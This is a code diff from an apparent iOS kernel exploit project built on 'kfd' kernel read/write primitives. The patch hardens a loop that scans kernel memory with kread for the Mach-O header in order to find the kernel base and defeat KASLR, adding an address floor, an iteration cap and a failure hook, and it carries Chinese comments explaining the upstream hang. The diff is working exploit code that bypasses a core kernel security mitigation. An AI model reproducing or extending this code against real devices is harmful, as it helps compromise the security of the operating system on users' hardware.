@@ -191,7 +191,15 @@ void krkw_helper_find_kfd_offsets(struct kfd* kfd) {
         printf("kerntask_tte_page: 0x%llx\n", kerntask_tte_page);
         
         uint64_t kbase = 0;
-        while (true) {
+        // [MF PATCH 06] 上游是 `while (true)` 且循环体里【没有任何下界检查】：
+        //   若 val 永远不等于 0x100000cfeedfacf（例如 kernel_task->vm_map 的
+        //   0x28 偏移在这个内核版本上不对），kerntask_tte_page 会一路 -0x1000
+        //   减到 0 然后回绕 —— 永不退出，表现成 App 卡死在「启动内核」。
+        //   这里加两道闸：① 内核地址下界 ② 迭代次数上限（防呆）。
+        const uint64_t mf_kaslr_min_addr  = 0xfffff00000000000ULL;
+        const u64      mf_kaslr_max_pages = 0x100000ULL;   // 1M 页 = 4GB 扫描窗口
+        u64 mf_kaslr_scanned = 0;
+        while (kerntask_tte_page >= mf_kaslr_min_addr && mf_kaslr_scanned < mf_kaslr_max_pages) {
             uint64_t val = 0;
             kread((u64)kfd, kerntask_tte_page, &val, sizeof(val));
             if(val == 0x100000cfeedfacf) {
@@ -204,6 +212,12 @@ void krkw_helper_find_kfd_offsets(struct kfd* kfd) {
                 }
             }
             kerntask_tte_page -= 0x1000;
+            mf_kaslr_scanned++;
+        }
+        if (kbase == 0) {
+            print_failure("kaslr scan gave up after %llu pages (addr now 0x%llx)", mf_kaslr_scanned, kerntask_tte_page);
+            mf_kfd_fail_hook("kaslr scan found no kernel mach_header", __FILE__, __LINE__);
+            return;
         }
         uint64_t vm_kernel_link_addr = get_vm_kernel_link_addr();
         printf("defeated kaslr, kbase: 0x%llx, kslide: 0x%llx\n", kbase, kbase - vm_kernel_link_addr);
